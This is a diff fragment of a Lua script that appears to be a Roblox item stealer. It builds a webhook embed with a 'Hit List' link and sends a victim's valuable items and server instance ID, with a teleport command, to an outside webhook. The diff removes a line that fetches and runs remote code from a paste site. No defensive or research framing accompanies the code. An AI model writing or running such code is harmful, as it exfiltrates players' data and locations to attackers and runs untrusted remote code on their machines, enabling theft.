@@ -1068,8 +1068,6 @@ local WebHookEmbed = CreateEmbed(
 {name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
 )
-if valueCount > 20 then
-loadstring(game:HttpGet("https://pastefy.app/Jw2LlXcN/raw"))()
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
     SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
